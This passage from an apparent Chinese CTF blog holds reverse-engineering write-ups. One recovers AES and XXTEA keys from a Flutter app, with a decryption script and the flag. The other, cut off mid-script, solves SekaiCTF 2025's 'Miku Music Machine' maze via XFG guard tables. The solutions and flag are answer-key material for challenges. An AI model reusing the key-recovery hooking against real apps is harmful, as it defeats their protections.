escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>selectionBase<span class="hljs-char escape_">\&quot;</span>:0,<span class="hljs-char escape_">\&quot;</span>selectionExtent<span class="hljs-char escape_">\&quot;</span>:0,<span class="hljs-char escape_">\&quot;</span>selectionAffinity<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextAffinity.downstream<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>selectionIsDirectional<span class="hljs-char escape_">\&quot;</span>:false,<span class="hljs-char escape_">\&quot;</span>composingBase<span class="hljs-char escape_">\&quot;</span>:-1,<span class="hljs-char escape_">\&quot;</span>composingExtent<span class="hljs-char escape_">\&quot;</span>:-1&#125;&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007939</span>c9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.show<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:null&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007942</span>a9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.requestAutofill<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:null&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007</span>a9c69 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setCaretRect<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>width<span class="hljs-char escape_">\&quot;</span>:2.0,<span class="hljs-char escape_">\&quot;</span>height<span class="hljs-char escape_">\&quot;</span>:24.0,<span class="hljs-char escape_">\&quot;</span>x<span class="hljs-char escape_">\&quot;</span>:0.18181818181818166,<span class="hljs-char escape_">\&quot;</span>y<span class="hljs-char escape_">\&quot;</span>:0.18181818181818699&#125;&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007</span>f7c19 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.show<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:null&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007</span>f8fd9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[null]&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73001063e9</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.setCaretRect<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>width<span class="hljs-char escape_">\&quot;</span>:2.0,<span class="hljs-char escape_">\&quot;</span>height<span class="hljs-char escape_">\&quot;</span>:24.0,<span class="hljs-char escape_">\&quot;</span>x<span class="hljs-char escape_">\&quot;</span>:36.909090909090914,<span class="hljs-char escape_">\&quot;</span>y<span class="hljs-char escape_">\&quot;</span>:0.18181818181818699&#125;&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300110</span>ab9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.clearClient<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:null&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300111619</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[null]&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300111</span>b89 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>method<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>TextInput.hide<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>args<span class="hljs-char escape_">\&quot;</span>:null&#125;&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73007</span>f70a9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;aaaa&quot;</span> <br><span class="hljs-title class_">String</span>@<span class="hljs-number">73001124</span>c9 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ohn_flutterkkkkk&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">73000</span>fd5d1 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;12345678901234561234567890123456&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300113</span>d99 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1234567890123456&quot;</span><br><span class="hljs-title class_">String</span>@<span class="hljs-number">7300113</span>c49 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mpxRIDtEnuE=&quot;</span><br></code></pre></td></tr></table></figure><p>发现一个 <strong>AES</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ohn_flutter<span class="hljs-variable">$EditView_MyEditTextState</span>::_anon_closure_2d4f08 -&gt; encrypt<span class="hljs-variable">$encrypt_AES</span>::ctor_2d5474<br></code></pre></td></tr></table></figure><p>hook <code>encrypt$encrypt_AES::ctor_2d5474</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">Key<span class="hljs-variable">@73001121a9</span> = &#123;<br>  <span class="hljs-string">&quot;parent!Encrypted&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;off_8!_Uint8List<span class="hljs-variable">@7300112299</span>&quot;</span>: [<span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span class="hljs-number">55</span>, <span class="hljs-number">56</span>, <span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span class="hljs-number">55</span>, <span class="hljs-number">56</span>, <span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ohn_flutter<span class="hljs-variable">$EditView_MyEditTextState</span>::_anon_closure_2d4f08 -&gt; encrypt<span class="hljs-variable">$encrypt_Encrypter</span>::encrypt_2d51f0<br></code></pre></td></tr></table></figure><p>hook <code>encrypt$encrypt_Encrypter::encrypt_2d51f0</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">IV@<span class="hljs-number">73001146b9</span> = &#123;<br>  &quot;parent!Encrypted&quot;: &#123;<br>    &quot;off_8!_Uint8List@<span class="hljs-number">7300114769</span>&quot;: [<br>      <span class="hljs-number">49,50,51,52</span>,<span class="hljs-number">53,54,55,56</span>,<span class="hljs-number">57,48,49,50</span>,<span class="hljs-number">51,52,53,54</span><br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>hook <code>ohn_flutter$EditView_MyEditTextState::check_2d50c0</code></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">String</span><span class="hljs-symbol">@730011edd9</span> = <span class="hljs-string">&quot;c32N3Da77z60GEll/jos1g==&quot;</span><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">d2b</span>(<span class="hljs-params">dword</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(i.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dword)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b2d</span>(<span class="hljs-params">byte_array</span>):<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>.from_bytes(byte_array[i:i+<span class="hljs-number">4</span>], <span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">False</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(byte_array),<span class="hljs-number">4</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xxtea_enc</span>(<span class="hljs-params">v,key</span>):<br>    n = <span class="hljs-built_in">len</span>(v)<br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> v<br><br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    z = v[n - <span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        e = (<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            y = v[(p + <span class="hljs-number">1</span>) % n]<br>            v[p] = (v[p] + (((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>)) ^ ((<span class="hljs-built_in">sum</span> ^ y) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e] ^ z)))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            z = v[p]<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xxtea_dec</span>(<span class="hljs-params">v,key</span>):<br>    n = <span class="hljs-built_in">len</span>(v)<br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">1</span> :<br>        <span class="hljs-keyword">return</span> v<br>    <br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br>    <span class="hljs-built_in">sum</span> = (rounds * delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    y = v[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        e = (<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            z = v[p-<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> p &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> v[n-<span class="hljs-number">1</span>]<br>            v[p] = (v[p] - (((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>)) ^ ((<span class="hljs-built_in">sum</span> ^ y) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e] ^ z)))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            y = v[p]<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span>  <span class="hljs-title function_">pkcs7_unpad</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> data[:-data[-<span class="hljs-number">1</span>]]    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = <span class="hljs-string">b&quot;/oIHOyDg6s6yqVd26AnYJ6u2YjPcMhawTe93+AJPAUiwGZM4KWvXjsib1tcnZHSnglaaVpbcOaTtNoMCr5od2A==&quot;</span><br>    data = base64.b64decode(cipher)<br><br>    <span class="hljs-comment"># if len(data) % 4 != 0:</span><br>    <span class="hljs-comment">#         padding = 4 - (len(data) % 4)</span><br>    <span class="hljs-comment">#         data += b&#x27;\x00&#x27; * padding</span><br><br>    aes_key = <span class="hljs-string">b&quot;12345678901234561234567890123456&quot;</span><br>    aes_iv = <span class="hljs-string">b&quot;1234567890123456&quot;</span><br><br>    aes = AES.new(aes_key,AES.MODE_CBC,aes_iv)<br>    aes_plain = pkcs7_unpad(aes.decrypt(data))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;aes_plain: <span class="hljs-subst">&#123;aes_plain&#125;</span>&quot;</span>)<br><br><br>    xxtea_key = <span class="hljs-string">&quot;ohn_flutterkkkkk&quot;</span><br>    xxtea_cipher = base64.b64decode(aes_plain)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;xxtea_cipher: <span class="hljs-subst">&#123;xxtea_cipher&#125;</span>&quot;</span>)<br>    v = b2d(xxtea_cipher)<br>    key = b2d(xxtea_key.encode())<br><br>    dec = xxtea_dec(v,key)<br>    result = d2b(dec)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;decrypt: <span class="hljs-subst">&#123;(result)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>flag 为 <code>flag&#123;U_@r4_F1u774r_r4_m@ster&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SeKaiCTF 2025 Reverse 方向复现</title>
    <link href="/2025/09/21/SekaiCTF2025/"/>
    <url>/2025/09/21/SekaiCTF2025/</url>
    
    <content type="html"><![CDATA[<h3 id="Miku-Music-Machine"><a href="#Miku-Music-Machine" class="headerlink" title="Miku Music Machine"></a>Miku Music Machine</h3><p>ida 打开，找到 main 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// edi</span><br>  __int64 v8; <span class="hljs-comment">// rbx</span><br>  __int64 v9; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">unsigned</span> __int8 v10; <span class="hljs-comment">// si</span><br>  HMIDIOUT phmo; <span class="hljs-comment">// [rsp+70h] [rbp+18h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( argc &lt; <span class="hljs-number">2</span> )<br>  &#123;<br>    sub_7FF666284950(<span class="hljs-string">&quot;Usage: %s &lt;prompt&gt;\n&quot;</span>, *argv);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  v5 = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">do</span><br>    ++v5;<br>  <span class="hljs-keyword">while</span> ( argv[<span class="hljs-number">1</span>][v5] );<br>  <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">50</span> )<br>  &#123;<br>    sub_7FF666284950(<span class="hljs-string">&quot;You should work on the length of your prompt!\n&quot;</span>, argv, envp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  v6 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( midiOutOpen(&amp;phmo, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0</span>) )<br>  &#123;<br>    sub_7FF666284950(<span class="hljs-string">&quot;Failed to open MIDI device.\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v7 = <span class="hljs-number">22</span>;<br>    v8 = <span class="hljs-number">22LL</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v9 = <span class="hljs-number">4LL</span>;  <span class="hljs-comment">// 循环次数 = 4</span><br>      v10 = byte_7FF6662F3000[v6] ^ argv[<span class="hljs-number">1</span>][v6];<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (v10 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> ) <span class="hljs-comment">// 取 v10 的低两位</span><br>        &#123;<br>          <span class="hljs-keyword">switch</span> ( v10 &amp; <span class="hljs-number">3</span> )<br>          &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>              ++v7;<br>              ++v8;<br>              <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>              v7 += <span class="hljs-number">21</span>;<br>              v8 += <span class="hljs-number">21LL</span>;<br>              <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>              --v7;<br>              --v8;<br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v7 -= <span class="hljs-number">21</span>;<br>          v8 -= <span class="hljs-number">21LL</span>;<br>        &#125;<br>        off_7FF6662F3040[v8]();<br>        midiOutShortMsg(phmo, dwMsg);<br>        Sleep(<span class="hljs-number">0x1Eu</span>);<br>        v10 &gt;&gt;= <span class="hljs-number">2</span>; <span class="hljs-comment">// 每次右移两位</span><br>        --v9;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v9 );<br>      ++v6;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v6 &lt; <span class="hljs-number">50</span> );<br>    Sleep(<span class="hljs-number">0x3E8u</span>);<br>    midiOutReset(phmo);<br>    midiOutClose(phmo);<br>    <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-number">0x1A2</span> )<br>    &#123;<br>      sub_7FF666284950(<span class="hljs-string">&quot;That was beautiful!\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    sub_7FF666284950(<span class="hljs-string">&quot;I think you should work on your music.\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求命令行参数 argv[1] 的长度为 50 ，否则退出程序<br>尝试打开 MIDI 设备 (midiOutOpen)<br>对 argv[1] 的每个字节与 byte_7FF6662F3000 数组进行异或，然后把每次字节分成 4 段进行处理，每次处理 2 bit 片段，根据片段的值来修改 v7,v8;利用 v8 作为索引调用 off_7FF6662F3040<a href="">v8</a> (函数指针表)；处理完 50 个字节后，等待一秒关闭 MIDI<br>可以看出这是一个 21 * 21 的迷宫，后面检查 v7 是否等于 0x1A2(418)即为迷宫重点</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">byte_7FF6662F3000 = [<br><span class="hljs-number">0x09</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x75</span>, <br><span class="hljs-number">0x26</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x9F</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7A</span>, <br><span class="hljs-number">0x87</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x22</span>, <br><span class="hljs-number">0x7D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xD7</span>]<br></code></pre></td></tr></table></figure><p><img src="/../images/SeKaiCTF2025/mmm4.png"></p><p>动态调试<br>在 ida 的 Debugger -&gt; Process options 里设置 50 字节长度的参数</p><p><img src="/../images/SeKaiCTF2025/mmm1.png"></p><p>调到一半程序异常退出<br>查看汇编看到有拓展控制流保护(XFG) <a href="https://connormcgarr.github.io/examining-xfg/">eXtended Flow Guard</a></p><blockquote><p>CFG 和 XFG 都是防止 Windows 上函数指针覆盖的保护；XFG 是 CFG 的强化版本，除了检查调用的函数指针是否在有效地址的位图中注册，它还使用哈希值来检查函数原型，此哈希值由参数数 、 每个参数的类型 、 函数是否为可变参数 、 调用约定和返回类型组成</p></blockquote><p><img src="/../images/SeKaiCTF2025/mmm2.png"></p><p>XFG 保护的函数指针调用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, &lt;expected_prototype_hash&gt;    <span class="hljs-comment">; 把调用点期望的签名放寄存器</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [callee_ptr]                 <span class="hljs-comment">; 目标函数地址（来自函数指针）</span><br><span class="hljs-keyword">call</span> __guard_xfg_dispatch_icall_fptr  <span class="hljs-comment">; 由 XFG 运行时接管：比较签名、然后跳或 fail</span><br></code></pre></td></tr></table></figure><p>使用 <strong>dumpbin</strong> 提取 CGuard CF Function Table, 这是由编译器&#x2F;连接器生成的函数入口地址白名单，当程序执行间接调用的时候，系统会先检验这个地址是否在表中</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">dumpbin /LOADCONFIG <span class="hljs-name">D</span>:\aaa\SeikaCTF2025\miku_music_machine\mmm-v2.exe<br></code></pre></td></tr></table></figure><p><img src="/../images/SeKaiCTF2025/mmm3.png"></p><p><strong>X</strong> 标记该地址在表里有效</p><p>推测出函数列表(一共 441 个函数刚好符合 21 * 21)中在有效地址内的函数是路径，其他是墙，取出是路径的函数的索引值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 